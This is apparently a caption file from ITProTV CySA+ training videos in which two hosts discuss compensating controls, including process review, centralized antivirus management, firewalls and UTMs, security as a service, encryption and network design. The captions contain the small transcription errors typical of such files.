three.\n&gt;&gt; Sounds good to me.\n\n641\n00:32:45.252 --> 00:32:46.170\n&gt;&gt; All right, let's go ahead and\n\n642\n00:32:46.170 --> 00:32:47.510\ndo that, we'll sign out here.\n\n643\n00:32:47.510 --> 00:32:50.500\nDan, as always, we appreciate having\nyou here in the studios with us.\n\n644\n00:32:50.500 --> 00:32:52.080\nWe appreciate you, the viewer, watching.\n\n645\n00:32:52.080 --> 00:32:55.160\nRemember, hop on over to\nITProTV library and look at\n\n646\n00:32:55.160 --> 00:32:59.140\nall the CySa+ shows that this gentleman\nhas been working very diligently on.\n\n647\n00:32:59.140 --> 00:33:02.417\nWhether your in the real world or tackling\nthat exam, you're gonna be successful.\n\n648\n00:33:02.417 --> 00:33:04.143\nAnd until we see you again,\nI've been your host, Wes Bryan.\n\n649\n00:33:04.143 --> 00:33:05.480\n&gt;&gt; And I'm Daniel Lowry.\n\n650\n00:33:05.480 --> 00:33:09.674\n&gt;&gt; We'll see you next time.\n\n651\n00:33:09.674 --> 00:33:13.150\n[MUSIC]\n\n652\n00:33:13.150 --> 00:33:16.036\n&gt;&gt; Thank you for watching ITProTV.\n\n",

California.\n\n3\n00:00:04.040 --> 00:00:06.174\n&gt;&gt; [CROSSTALK]\n[MUSIC]\n\n4\n00:00:06.174 --> 00:00:11.595\n&gt;&gt; You watching ITProTV.\n\n5\n00:00:11.595 --> 00:00:13.160\n&gt;&gt; Hello, ladies and gentlemen.\n\n6\n00:00:13.160 --> 00:00:16.705\nThank you for tuning in to ITProTV and\nchoosing us for your learning needs.\n\n7\n00:00:16.705 --> 00:00:17.950\nI'm your show host Wes Bryan.\n\n8\n00:00:17.950 --> 00:00:22.316\nAnd in today's episode what we are\ncontinuing journeying through Size A+ and\n\n9\n00:00:22.316 --> 00:00:24.840\njoining us back in\nthe studios is Dan Lowrie.\n\n10\n00:00:24.840 --> 00:00:26.350\nDan, how are we doing today sir?\n\n11\n00:00:26.350 --> 00:00:27.159\n&gt;&gt; Doing fantastic Wes.\n\n12\n00:00:27.159 --> 00:00:31.574\nWe are back again for like you said\na Size A+ episode, actually part three.\n\n13\n00:00:31.574 --> 00:00:33.042\n&gt;&gt; A trilogy.\n&gt;&gt; That's right we're working on\n\n14\n00:00:33.042 --> 00:00:33.700\nthe trilogy.\n\n15\n00:00:33.700 --> 00:00:38.795\nThis is the Return of the Jedi\nversion of [LAUGH] of what was it?\n\n16\n00:00:38.795 --> 00:00:41.670\nCompensating controls and security\narchitectures that's what we are looking\n\n17\n00:00:41.670 --> 00:00:43.530\nat, we are gonna continue\nthe conversation.\n\n18\n00:00:43.530 --> 00:00:45.820\nHopefully we'll wrap\nit up in this episode,\n\n19\n00:00:45.820 --> 00:00:47.240\nI don't like to go too\nmuch farther than this.\n\n20\n00:00:47.240 --> 00:00:48.450\nSo we'll talk quickly.\n\n21\n00:00:48.450 --> 00:00:52.320\nWe'll get you to the information you need,\nand get you moving on your way.\n\n22\n00:00:52.320 --> 00:00:53.490\n&gt;&gt; Yeah, Dan, so in the last episode,\n\n23\n00:00:53.490 --> 00:00:55.900\nwe kinda wrapped up things\nlike defense and doubts.\n\n24\n00:00:55.900 --> 00:00:58.648\nWhat's the next thing that\nwe're gonna be looking at here?\n\n25\n00:00:58.648 --> 00:01:00.210\n&gt;&gt; We're gonna move into processes.\n\n26\n00:01:00.210 --> 00:01:03.470\nWe talked about processes and how we can\nuse those as a compensating control.\n\n27\n00:01:03.470 --> 00:01:08.128\nCreating specific checklist type systems\nfor us to be able to walk through,\n\n28\n00:01:08.128 --> 00:01:10.030\nkeep us making from mistakes.\n\n29\n00:01:10.030 --> 00:01:12.977\nAnd to make sure that everybody knows\nwhat it is that you're supposed to be\n\n30\n00:01:12.977 --> 00:01:13.890\ndoing, right?\n\n31\n00:01:13.890 --> 00:01:19.550\nSo, we need to have a little bit more of a\nconversation on that just really quickly.\n\n32\n00:01:19.550 --> 00:01:23.460\nWe gotta make sure that we understand that\nthis is not a one and done idea, okay?\n\n33\n00:01:23.460 --> 00:01:25.730\nHopefully I mentioned\nthat back when we rirst,\n\n34\n00:01:25.730 --> 00:01:30.440\ninitially it talked about creating\nprocesses but I'm going to rehash that.\n\n35\n00:01:30.440 --> 00:01:32.770\nThis should be a continual revolution.\n\n36\n00:01:32.770 --> 00:01:36.130\nThe process that you have now may\nnot be the process that you used.\n\n37\n00:01:36.130 --> 00:01:39.390\nAnd probably should not be the process\nthat you use in the future.\n\n38\n00:01:39.390 --> 00:01:44.970\nI say probably because maybe that process\nthat you have created Is good for\n\n39\n00:01:44.970 --> 00:01:45.550\nquite some time.\n\n40\n00:01:45.550 --> 00:01:47.700\nMaybe you did a really good\njob of putting it together,\n\n41\n00:01:47.700 --> 00:01:52.010\nit works well, and you found all\nthe blind spots in the first go round.\n\n42\n00:01:52.010 --> 00:01:53.500\nIt could have happened.\n\n43\n00:01:53.500 --> 00:01:55.320\nIt's unlikely but it could.\n\n44\n00:01:55.320 --> 00:02:00.230\nBut it doesn't alleviate us from our\nresponsibility to re-look at things,\n\n45\n00:02:00.230 --> 00:02:03.413\nwalking through them and\ndoing lessons learned.\n\n46\n00:02:03.413 --> 00:02:06.145\nAnd figuring out where can we improve and\n\n47\n00:02:06.145 --> 00:02:10.600\nthen implementing those\nimprovements into our new process?\n\n48\n00:02:10.600 --> 00:02:12.750\nSo this is something\nthat continually evolves.\n\n49\n00:02:13.900 --> 00:02:17.150\nAnd also ensures that our process\nnever becomes outdated right?\n\n50\n00:02:17.150 --> 00:02:18.070\nWe don't want that to happen.\n\n51\n00:02:18.070 --> 00:02:21.390\nIt's like why are we still using\nthis old system over here?\n\n52\n00:02:21.390 --> 00:02:22.800\nWell I don't know it's\npart of the process.\n\n53\n00:02:22.800 --> 00:02:24.610\nSo that's what we do.\n\n54\n00:02:24.610 --> 00:02:28.030\nSo it keeps that outdating\nidea from happening.\n\n55\n00:02:28.030 --> 00:02:31.740\n&gt;&gt; So when you say out dating are you\ntalking about the retirement of processes\n\n56\n00:02:31.740 --> 00:02:33.990\nand if we are, why?\n\n57\n00:02:33.990 --> 00:02:37.102\n&gt;&gt; Yes good question,\nshould we be retiring processes?\n\n58\n00:02:37.102 --> 00:02:38.310\nYes that's right,\n\n59\n00:02:38.310 --> 00:02:43.795\nas you create new processes you probably\nneed to be retiring the old ones.\n\n60\n00:02:43.795 --> 00:02:48.150\nCuz why keep it around this\nbrings on the idea of relevance,\n\n61\n00:02:48.150 --> 00:02:52.300\nit's no longer relevant\nif we have a new process.\n\n62\n00:02:52.300 --> 00:03:00.140\nOr if we have a process that does the same\nthing, now we've got a redundant process.\n\n63\n00:03:00.140 --> 00:03:04.640\nWhy do we have two processes that\nbasically give me the same end result?\n\n64\n00:03:04.640 --> 00:03:07.390\nAnd a lot of times that just comes\naround from the fact that you had\n\n65\n00:03:07.390 --> 00:03:12.040\ntwo different people that were working\nin or around the same systems and\n\n66\n00:03:12.040 --> 00:03:13.740\nsaid, we need a process for doing that.\n\n67\n00:03:13.740 --> 00:03:16.186\nI'll put it in this process and\nthere you go.\n\n68\n00:03:16.186 --> 00:03:18.166\nPretty simple.\n\n69\n00:03:18.166 --> 00:03:22.852\nBut if you're doing that continual review,\nyou're gonna find those redundant and\n\n70\n00:03:22.852 --> 00:03:24.248\nirrelevant processes.\n\n71\n00:03:24.248 --> 00:03:27.620\nAnd then work toward retiring and\ngetting them out of the business.\n\n72\n00:03:28.860 --> 00:03:31.340\nAnother thing a new and\nbetter process coming along, right?\n\n73\n00:03:31.340 --> 00:03:35.290\nYou're doing that review, you're\nwatching it, you're going you know what?\n\n74\n00:03:35.290 --> 00:03:37.850\nThis old process can now be put to bed.\n\n75\n00:03:37.850 --> 00:03:40.950\nWe no longer need it because\nthe new process that we developed\n\n76\n00:03:40.950 --> 00:03:43.480\nis doing the job and\nnow we're gonna start reviewing that.\n\n77\n00:03:43.480 --> 00:03:46.820\nWe can go ahead and\nsandbox the old guy and\n\n78\n00:03:46.820 --> 00:03:51.190\nthen don't forget to document\nthe facts of what the old process was.\n\n79\n00:03:51.190 --> 00:03:51.746\nWhy you put it to bed.\n\n80\n00:03:51.746 --> 00:03:53.809\nWhy it's no longer being used.\n\n81\n00:03:53.809 --> 00:03:57.040\nAnd what process took over in it's place.\n\n82\n00:03:57.040 --> 00:04:00.950\nWhat you're doing to continue the work\nthat the old process do, right?\n\n83\n00:04:00.950 --> 00:04:02.430\nSo make sure that's all documented.\n\n84\n00:04:02.430 --> 00:04:05.500\n&gt;&gt; We got technologies\nthroughout our company, right?\n\n85\n00:04:05.500 --> 00:04:07.100\nAnd they're important.\n\n86\n00:04:07.100 --> 00:04:08.670\n&gt;&gt; Yes.\n&gt;&gt; But can you give us an example\n\n87\n00:04:08.670 --> 00:04:09.630\nof technology?\n\n88\n00:04:09.630 --> 00:04:10.670\n&gt;&gt; Yes, definitely.\n\n89\n00:04:10.670 --> 00:04:15.382\nSo what are some of the technologies that\nwe can use as compensating controls inside\n\n90\n00:04:15.382 --> 00:04:16.672\nof our environments?\n\n91\n00:04:16.672 --> 00:04:23.260\nOr as part of our secure design of\nthe architecture of our environment?\n\n92\n00:04:23.260 --> 00:04:24.980\nThese are very simple things.\n\n93\n00:04:24.980 --> 00:04:26.870\nWe're talking about\nlike antivirus systems.\n\n94\n00:04:26.870 --> 00:04:33.460\nWe're talking about reporting systems,\nseams, monitoring, log aggregation.\n\n95\n00:04:33.460 --> 00:04:36.210\nAll these stuff that we put in placed\n\n96\n00:04:36.210 --> 00:04:40.130\nto get a holistic view of what\nour system is looking like.\n\n97\n00:04:40.130 --> 00:04:42.020\nWhere the rough spots are?\n\n98\n00:04:42.020 --> 00:04:42.920\nWhere we can improve?\n\n99\n00:04:42.920 --> 00:04:44.490\nWhere we need to store up?\n\n100\n00:04:44.490 --> 00:04:47.580\nWhere things are working perfectly?\n\n101\n00:04:47.580 --> 00:04:48.840\nThat is what we're talking about.\n\n102\n00:04:48.840 --> 00:04:51.760\nSo let's get a little\nmore into depth on that.\n\n103\n00:04:51.760 --> 00:04:56.540\nAutomatic reporting, a lot of these\ntechnologies will implement some sort of\n\n104\n00:04:56.540 --> 00:04:59.300\nclick report button okay?\n\n105\n00:04:59.300 --> 00:05:00.860\nThis includes any of our systems.\n\n106\n00:05:00.860 --> 00:05:05.980\nIf you've ever worked with these large\nenterprise antivirus and malware systems.\n\n107\n00:05:05.980 --> 00:05:10.531\nYou'll see that you typically\nwill either have an appliance, or\n\n108\n00:05:10.531 --> 00:05:15.760\na specific server that is running\nthe service, or the management system.\n\n109\n00:05:15.760 --> 00:05:20.161\nOr your clients will be there, and\nit does a myriad of different things,\n\n110\n00:05:20.161 --> 00:05:23.360\nwhich is very helpful to\nus as administrators.\n\n111\n00:05:23.360 --> 00:05:26.820\nWhich is basically being able to\ngenerate reports, something like that.\n\n112\n00:05:26.820 --> 00:05:30.550\nBeing able to look at the health status\nof the clients, being able to deploy and\n\n113\n00:05:30.550 --> 00:05:33.850\nuninstall clients from\nthe centralized management system.\n\n114\n00:05:33.850 --> 00:05:38.540\nAnd you'll see these in things like\nKaspersky, Sophos Antivirus system,\n\n115\n00:05:38.540 --> 00:05:41.410\nSymantec Antivirus, endpoint protection.\n\n116\n00:05:41.410 --> 00:05:44.896\nAll these guys will have these\ncapabilities built in because in\n\n117\n00:05:44.896 --> 00:05:49.040\ntoday's day and age, really,\nwe've come to expect it.\n\n118\n00:05:49.040 --> 00:05:53.460\nEven in smaller management systems,\nyou'll, or smaller systems for home use,\n\n119\n00:05:53.460 --> 00:05:56.120\nyou'll see stuff that's similar.\n\n120\n00:05:56.120 --> 00:05:59.640\nSo that when you move to the big boys,\nyou're not completely out of your depths.\n\n121\n00:05:59.640 --> 00:06:03.470\nYou're like this is familiar to me,\nso that's something you'll see.\n\n122\n00:06:03.470 --> 00:06:06.660\nYou also see security appliances.\n\n123\n00:06:06.660 --> 00:06:09.160\nVery important pieces of equipment\nthat we need to be putting,\n\n124\n00:06:09.160 --> 00:06:13.400\ntechnologies that we need to\nbe using in our environments.\n\n125\n00:06:13.400 --> 00:06:15.810\nHopefully you've got the money to do this.\n\n126\n00:06:15.810 --> 00:06:18.360\nIf not, you're gonna try to figure\nout other ways to make that happen.\n\n127\n00:06:18.360 --> 00:06:20.270\nBut If you can get the money together,\n\n128\n00:06:20.270 --> 00:06:22.060\nit should definitely be\nbudgeted in as an item.\n\n129\n00:06:22.060 --> 00:06:26.070\nAnd these include things like UTMs,\nand next-gen firewalls, or\n\n130\n00:06:26.070 --> 00:06:27.680\njust regular firewalls.\n\n131\n00:06:27.680 --> 00:06:31.618\nAnything that can do ACLing,\nIDSs and IPSs, right?\n\n132\n00:06:31.618 --> 00:06:37.410\nSecurity-specific types of appliances\nthat we put on our systems.\n\n133\n00:06:37.410 --> 00:06:39.190\nNow, a router, can it do ACLs?\n\n134\n00:06:39.190 --> 00:06:40.700\nYeah, sure can.\n\n135\n00:06:40.700 --> 00:06:44.590\nIt's not a specific like\nsecurity appliance.\n\n136\n00:06:44.590 --> 00:06:48.890\nIt's meant to do routing, the fact that\nit has some security capabilities this is\n\n137\n00:06:48.890 --> 00:06:50.760\nnice but that's not it's job.\n\n138\n00:06:50.760 --> 00:06:56.170\nA firewall it's job is to secure our\nenvironments in some way by using ACLs,\n\n139\n00:06:56.170 --> 00:06:59.340\nDPAC inspection, especially when\nyou get into this next gen.\n\n140\n00:06:59.340 --> 00:07:01.810\nFirewalls they're super creepy,\nI love those things.\n\n141\n00:07:01.810 --> 00:07:04.470\nAnd the UTMs, amazing pieces of equipment.\n\n142\n00:07:04.470 --> 00:07:05.520\nSo if you can,\n\n143\n00:07:05.520 --> 00:07:09.110\nyou want to be putting these things\ninto your systems, a great technology.\n\n144\n00:07:09.110 --> 00:07:12.290\n&gt;&gt; You know Dan, you mentioned UTM,\nUnified Threat Management, that's great to\n\n145\n00:07:12.290 --> 00:07:16.150\nhave that centralized interface when we\nneed to manage multiple security products.\n\n146\n00:07:16.150 --> 00:07:19.830\nGreat to have but, we talk about\ncentralization and decentralization.\n\n147\n00:07:19.830 --> 00:07:23.970\nWe know, just in concept, decentralization\nincreases the administrative burden,\n\n148\n00:07:23.970 --> 00:07:25.000\nthe administrative overhead.\n\n149\n00:07:25.000 --> 00:07:28.480\nSo we want, centralized UTM is one\nof the ones that comes to mind, but\n\n150\n00:07:28.480 --> 00:07:31.460\nwe need to think of other concepts\nwhen it comes to centralization.\n\n151\n00:07:31.460 --> 00:07:33.780\n&gt;&gt; And that's why I've been\nbringing up things like antivirus.\n\n152\n00:07:33.780 --> 00:07:38.020\nI want you to get that mindset\nwhat Wes is talking about.\n\n153\n00:07:38.020 --> 00:07:39.220\nCentralized management.\n\n154\n00:07:39.220 --> 00:07:41.460\nI went to RSA this year,\nit was a lot of fun.\n\n155\n00:07:41.460 --> 00:07:45.530\nAnd that was one of the buzzwords,\ncentralized management.\n\n156\n00:07:45.530 --> 00:07:48.380\nI was like, if I have to deal with the\nterm centralized management one more time,\n\n157\n00:07:48.380 --> 00:07:49.470\nI'm gonna throw up.\n\n158\n00:07:49.470 --> 00:07:52.960\nBecause it's just everyone keeps\nat that and AI machine learning.\n\n159\n00:07:52.960 --> 00:07:56.228\nIt's everybody's got centralized\nmanagement, AI machine learning.\n\n160\n00:07:56.228 --> 00:08:01.191\nBut that's what we've come to expect in\nour products now because it does give us\n\n161\n00:08:01.191 --> 00:08:05.635\nthat ease of, Of getting that\n10,000 foot view of our systems and\n\n162\n00:08:05.635 --> 00:08:08.450\nthen being able to drill\ndown in where we see,\n\n163\n00:08:08.450 --> 00:08:11.785\nI kinda remember from Superman Returns or\nSuperman,\n\n164\n00:08:11.785 --> 00:08:17.580\nhe's just standing over Metropolis and\nhe's listening and he hears, right?\n\n165\n00:08:17.580 --> 00:08:20.990\nThere's someone being robbed and\nhe can fly in and save the day.\n\n166\n00:08:20.990 --> 00:08:23.640\nThat's kinda what we're doing\nwith these centralized systems.\n\n167\n00:08:23.640 --> 00:08:27.080\nWe're able to take a more\nholistic look at the health and\n\n168\n00:08:27.080 --> 00:08:31.120\nstatus of our environment,\nthen hone in on the problems.\n\n169\n00:08:31.120 --> 00:08:35.570\nI can get a report that generates maybe\nin my antivirus system and say, I've got\n\n170\n00:08:35.570 --> 00:08:40.520\nthree machines that have checked in as\nfar as I've done a ping sweep looking for\n\n171\n00:08:40.520 --> 00:08:42.730\nlive hosts on your network.\n\n172\n00:08:42.730 --> 00:08:46.150\nI found three and they didn't have the\nagent installed or the client installed.\n\n173\n00:08:48.010 --> 00:08:49.231\nWell, let's take a look.\n\n174\n00:08:49.231 --> 00:08:50.310\nWhat machines are those?\n\n175\n00:08:50.310 --> 00:08:51.852\nWell, here's a little rundown.\n\n176\n00:08:51.852 --> 00:08:54.180\nIt looks like they're running\nWindows operating systems.\n\n177\n00:08:54.180 --> 00:08:56.850\nThey're going to the domain,\nthey do have a user logged in.\n\n178\n00:08:56.850 --> 00:08:59.630\nThat's interesting information,\nwhy don't they have that client?\n\n179\n00:08:59.630 --> 00:09:01.300\nLet me go ahead and push that out and\n\n180\n00:09:01.300 --> 00:09:03.630\nI can create a task, and\nslide that out there.\n\n181\n00:09:03.630 --> 00:09:06.030\nAnd then they'll get that installed and\nit should be running.\n\n182\n00:09:06.030 --> 00:09:10.046\nAnd then I can check on that later to\nmake sure it doesn't get uninstalled and\n\n183\n00:09:10.046 --> 00:09:14.530\nmaybe I've got a user that's trying to do\nsomething that they shouldn't be doing.\n\n184\n00:09:14.530 --> 00:09:18.113\nThey've got malware already installed and\nit's ejecting the agent and\n\n185\n00:09:18.113 --> 00:09:19.530\nit's deleting it, right?\n\n186\n00:09:19.530 --> 00:09:21.900\nSo I can take a closer\nlook using these systems,\n\n187\n00:09:21.900 --> 00:09:25.380\ngetting that centralized management\nis gonna help us be able to do that.\n\n188\n00:09:25.380 --> 00:09:26.660\nLove the dashboards by the way.\n\n189\n00:09:26.660 --> 00:09:27.920\nThey're so nice.\n\n190\n00:09:27.920 --> 00:09:30.370\nEveryone has a great looking dashboard and\nit's hard to choose.\n\n191\n00:09:30.370 --> 00:09:32.550\nYou're like a kid in\na candy store anymore.\n\n192\n00:09:32.550 --> 00:09:34.010\n&gt;&gt; Dan, if we're in S &amp; D, right,\n\n193\n00:09:34.010 --> 00:09:38.100\nsmall, medium business maybe, or maybe\nwe're just a business that doesn't have\n\n194\n00:09:38.100 --> 00:09:41.520\ninside of our organization\na well-trained security staff, right?\n\n195\n00:09:41.520 --> 00:09:42.590\n&gt;&gt; Yeah.\n&gt;&gt; You've mentioned it before.\n\n196\n00:09:42.590 --> 00:09:43.580\nIf you can do the job good,\n\n197\n00:09:43.580 --> 00:09:46.802\nsometimes you might need to escalate it\nto get somebody that can do it great, but\n\n198\n00:09:46.802 --> 00:09:51.720\nother than have that infrastructure in\nplace and in-house, do I have options?\n\n199\n00:09:51.720 --> 00:09:53.140\n&gt;&gt; Yes, sir, you are absolutely correct.\n\n200\n00:09:53.140 --> 00:09:56.930\nAnd we talked about outsourcing employees,\npersonnel.\n\n201\n00:09:56.930 --> 00:10:01.110\nWe can also outsource our\nsecurity in many ways.\n\n202\n00:10:01.110 --> 00:10:03.760\nAnd this is what will be known as SECAAS.\n\n203\n00:10:03.760 --> 00:10:06.070\nI don't like to say it the other way.\n\n204\n00:10:06.070 --> 00:10:09.990\nSecurity as a service, SECAAS.\n\n205\n00:10:09.990 --> 00:10:13.220\nAnd this can be seen in\nvery simplistic terms\n\n206\n00:10:13.220 --> 00:10:16.840\nof something like outsourcing\nmy antivirus, antimalware.\n\n207\n00:10:16.840 --> 00:10:21.070\nI can get a cloud service to come in and\ntake over that.\n\n208\n00:10:21.070 --> 00:10:23.640\nAnd it'll just install a little\nagent on all my machines.\n\n209\n00:10:23.640 --> 00:10:27.100\nAnd they'll reach out through\nthe cloud and connect.\n\n210\n00:10:27.100 --> 00:10:29.040\nAnd they'll do all the reporting and\neverything.\n\n211\n00:10:29.040 --> 00:10:30.470\nAnd that's done up in the cloud.\n\n212\n00:10:30.470 --> 00:10:31.670\nI don't have to install an appliance.\n\n213\n00:10:31.670 --> 00:10:33.150\nI don't have to install a service.\n\n214\n00:10:33.150 --> 00:10:36.740\nI don't have to work with that there,\nI can go with the SEC.\n\n215\n00:10:36.740 --> 00:10:37.380\nIt's very simple.\n\n216\n00:10:37.380 --> 00:10:42.360\nLet me show you a really quick and dirty\neasy look at that, which is VirusTotal.\n\n217\n00:10:42.360 --> 00:10:44.757\nI just went to virustotal.com.\n\n218\n00:10:44.757 --> 00:10:46.100\nThis is their opening page.\n\n219\n00:10:46.100 --> 00:10:48.932\nAnd notice what they give\nyou the ability to do.\n\n220\n00:10:48.932 --> 00:10:52.050\n[COUGH] You can choose a file.\n\n221\n00:10:52.050 --> 00:10:56.310\nSlap it here, it will run a virus check\nand malware check against it with known\n\n222\n00:10:56.310 --> 00:10:59.520\nmalware signatures, using heuristic\nengines, the whole nine yards,\n\n223\n00:10:59.520 --> 00:11:02.710\nall the stuff we've come to know and\nlove when it comes to that.\n\n224\n00:11:02.710 --> 00:11:05.220\nAnd see if there's any kind\nof wrongdoing going on.\n\n225\n00:11:05.220 --> 00:11:06.600\nThey also have URLs,\n\n226\n00:11:06.600 --> 00:11:09.590\nyou can slap a URL in here and check\n&gt;&gt; See if there's\n\n227\n00:11:09.590 --> 00:11:10.790\nanything wrong with that.\n\n228\n00:11:10.790 --> 00:11:13.231\nIf it's a known malware\ndistribution center,\n\n229\n00:11:13.231 --> 00:11:15.250\nit's probably not where you wanna go.\n\n230\n00:11:15.250 --> 00:11:19.640\nIf it's known to be a known phishing site,\nalso that would be helpful.\n\n231\n00:11:19.640 --> 00:11:22.230\nBut I'm outsourcing that to VirusTotal.\n\n232\n00:11:22.230 --> 00:11:26.072\nI'm not installing some\nsoftware on a server and\n\n233\n00:11:26.072 --> 00:11:32.370\nthen it's on clients on my work stations\nand then having my people use that.\n\n234\n00:11:32.370 --> 00:11:33.780\nI'm updating it.\n\n235\n00:11:33.780 --> 00:11:35.330\nI'm having to do all the patching.\n\n236\n00:11:35.330 --> 00:11:37.480\nIf new versions come out,\nI gotta work with that and\n\n237\n00:11:37.480 --> 00:11:38.480\nmake sure the clients are up to date.\n\n238\n00:11:38.480 --> 00:11:40.200\nAre they getting their signatures?\n\n239\n00:11:40.200 --> 00:11:46.620\nA lot goes into doing my security as\nfar as anti-virus and malware goes.\n\n240\n00:11:46.620 --> 00:11:50.010\nOn my end if I'm an administrator but\nif I outsource it,\n\n241\n00:11:50.010 --> 00:11:54.040\nif I send it to a Security as a Service,\nnow all that updating,\n\n242\n00:11:54.040 --> 00:11:56.280\nall the agents are getting\nupdated automatically.\n\n243\n00:11:56.280 --> 00:11:57.270\nI don't have to take care of that.\n\n244\n00:11:57.270 --> 00:12:01.082\nI have given that over\nto my cloud provider.\n\n245\n00:12:01.082 --> 00:12:03.489\nSo that's one way in which\nyou can do these things.\n\n246\n00:12:04.850 --> 00:12:08.910\nDo be aware that it might be an agent that\nneeds to be installed for this to work.\n\n247\n00:12:08.910 --> 00:12:12.813\nSo you will have something locally,\nsometimes, but not always for\n\n248\n00:12:12.813 --> 00:12:17.537\nit to actually make the connection to the\ncloud service from your workstations and\n\n249\n00:12:17.537 --> 00:12:18.304\nyour hosts.\n\n250\n00:12:18.304 --> 00:12:22.029\nAll right, let's move on to cryptography,\n\n251\n00:12:22.029 --> 00:12:27.825\nanother cool technology that we use to,\nwell, shore up our systems.\n\n252\n00:12:27.825 --> 00:12:33.910\nIt makes sure that your data is secure\nat rest and on the wire, right?\n\n253\n00:12:33.910 --> 00:12:37.830\nSo you've got to remember your data\ndoesn't typically stay static.\n\n254\n00:12:37.830 --> 00:12:40.000\nIt moves from time to time.\n\n255\n00:12:40.000 --> 00:12:43.790\nBut you wanna be able to protect it,\nwhether it's sitting somewhere, or\n\n256\n00:12:43.790 --> 00:12:48.170\nwhether I'm transmitting it from one\nplace to the other, in different [COUGH]\n\n257\n00:12:48.170 --> 00:12:54.660\ncryptologies or cryptographic encryption\ntechnologies will provide for that.\n\n258\n00:12:54.660 --> 00:12:58.630\nThen you just have to make sure that you\nuse them if they are available to you.\n\n259\n00:12:58.630 --> 00:13:00.970\nAnd if not, then you probably\nwanna look for something else.\n\n260\n00:13:00.970 --> 00:13:04.390\nSo if you're using a system that\ndoesn't provide encryption,\n\n261\n00:13:04.390 --> 00:13:07.440\nmaybe you can make a VVN connection.\n\n262\n00:13:07.440 --> 00:13:10.430\nSo that when it does move at\nleast that data is encrypted\n\n263\n00:13:10.430 --> 00:13:14.360\neven though the system that you're using\nper se doesn't have that built in.\n\n264\n00:13:14.360 --> 00:13:15.834\nSo you can kind of bolt that stuff on.\n\n265\n00:13:17.365 --> 00:13:19.955\nSo be looking for\nhow encryption is deployed.\n\n266\n00:13:19.955 --> 00:13:22.645\nAre there any points in which the data\n\n267\n00:13:22.645 --> 00:13:25.465\nbecomes unencrypted as it\ntravels across the wire?\n\n268\n00:13:25.465 --> 00:13:26.880\nThat's a very important thing.\n\n269\n00:13:26.880 --> 00:13:30.835\nYou'll wanna identify those spots and\naccount for them.\n\n270\n00:13:30.835 --> 00:13:32.745\nAt least you know, okay?\n\n271\n00:13:32.745 --> 00:13:38.125\nIt's not gonna be a surprise to you if\nyour data gets captured at that specific\n\n272\n00:13:38.125 --> 00:13:43.330\npoint and is exfiltrated by\na third bad party, right?\n\n273\n00:13:43.330 --> 00:13:44.940\nSo if that happens, then you say, well,\n\n274\n00:13:44.940 --> 00:13:46.960\nmaybe we should have done\nsomething about that.\n\n275\n00:13:46.960 --> 00:13:50.230\nBut at least you knew it was there and you\nknow that's the weak spot in my system.\n\n276\n00:13:50.230 --> 00:13:52.740\nAnd remember your security is only\n\n277\n00:13:52.740 --> 00:13:56.030\nas strong as your weakest link\njust like any other chain, right?\n\n278\n00:13:56.030 --> 00:14:00.320\nAnd make sure you protect your private\nkeys if your using key [LAUGH] encryption\n\n279\n00:14:00.320 --> 00:14:02.150\nof some type.\n\n280\n00:14:02.150 --> 00:14:05.164\nIf you're giving out the private keys,\nyou might as well not have encryption.\n\n281\n00:14:05.164 --> 00:14:07.110\nIt's fine to give out those public keys.\n\n282\n00:14:07.110 --> 00:14:09.020\nBut if you have something\nthat needs to remain private,\n\n283\n00:14:09.020 --> 00:14:12.090\ndo your best to maintain\nit in a private way.\n\n284\n00:14:12.090 --> 00:14:14.315\nSo that it's not everybody and\ntheir brother having it.\n\n285\n00:14:14.315 --> 00:14:17.680\n&gt;&gt; Don, how does network design play into\nthe larger picture of things when we think\n\n286\n00:14:17.680 --> 00:14:18.480\nof architecture?\n\n287\n00:14:18.480 --> 00:14:19.860\nIs that something we\nhave to consider as well?\n\n288\n00:14:19.860 --> 00:14:23.530\n&gt;&gt; Yeah, we definitely have\nto consider just the idea of\n\n289\n00:14:23.530 --> 00:14:25.210\nhow is my network laid out?\n\n290\n00:14:26.300 --> 00:14:30.070\nBecause if you think of it, again,\n\n291\n00:14:30.070 --> 00:14:33.690\nfrom a 10,000 foot view,\nyou start to look at your design.\n\n292\n00:14:33.690 --> 00:14:39.328\nAnd creating network diagrams will\nhelp you with this process very much\n\n293\n00:14:39.328 --> 00:14:44.550\ncuz then you'll be able to see the logical\nflow of the data as it enters and\n\n294\n00:14:44.550 --> 00:14:48.160\nexits your environment.\n\n295\n00:14:48.160 --> 00:14:51.510\nSo if I'm looking at data,\nI'm always going to have that, well,\n\n296\n00:14:51.510 --> 00:14:53.830\nunless you air gap some\nweird government system, but\n\n297\n00:14:53.830 --> 00:14:58.950\ntypically you have the untrusted network,\nalso known as the Internet.\n\n298\n00:14:58.950 --> 00:15:00.360\nThat's typically where you're going to.\n\n299\n00:15:01.380 --> 00:15:07.260\nOnce data comes into or goes out\nto that system, how is it handled?\n\n300\n00:15:07.260 --> 00:15:08.000\nWe gotta look at that.\n\n301\n00:15:08.000 --> 00:15:10.020\nNow we have two ways in\nwhich this can occur.\n\n302\n00:15:10.020 --> 00:15:14.291\nWe've got traditional on-prem,\nwhich is on premises.\n\n303\n00:15:14.291 --> 00:15:18.459\nWhere routers and switches and firewalls\nand IBSs and such and such and DMVs and\n\n304\n00:15:18.459 --> 00:15:20.520\nall that great stuff.\n\n305\n00:15:20.520 --> 00:15:21.530\nBut we also have cloud.\n\n306\n00:15:21.530 --> 00:15:27.030\nAnd what if I have cloud services,\nhow does that network design look, right?\n\n307\n00:15:27.030 --> 00:15:28.640\nSo, and don't forget cloud services.\n\n308\n00:15:28.640 --> 00:15:31.842\nThis is the SaaSs and\nthe PaaSs of the world, so\n\n309\n00:15:31.842 --> 00:15:34.760\nsecure, yeah, SECAAS on the brain.\n\n310\n00:15:34.760 --> 00:15:38.070\nThis is Software as a Service and\nPlatform as a Service,\n\n311\n00:15:38.070 --> 00:15:41.470\nthese very traditional models\nof your cloud technologies.\n\n312\n00:15:41.470 --> 00:15:44.290\nThere are security concerns\nthat can go along with those.\n\n313\n00:15:44.290 --> 00:15:49.594\nAnd some of the underlying operating\nsystems that the cloud provider is using,\n\n314\n00:15:49.594 --> 00:15:54.041\nare they being kept up to date,\nare they being patched regularly?\n\n315\n00:15:54.041 --> 00:15:58.334\nAnd can I have information\nas to the goings on of\n\n316\n00:15:58.334 --> 00:16:01.425\nthat third party applications.\n\n317\n00:16:01.425 --> 00:16:05.091\nThe hypervisor that's being used\non the virtual machine that\n\n318\n00:16:05.091 --> 00:16:09.543\nactually runs The machine that I'm\nrenting from you, how does that look?\n\n319\n00:16:09.543 --> 00:16:12.030\nIs that being patched, is that\nbeing serviced, how does that look?\n\n320\n00:16:12.030 --> 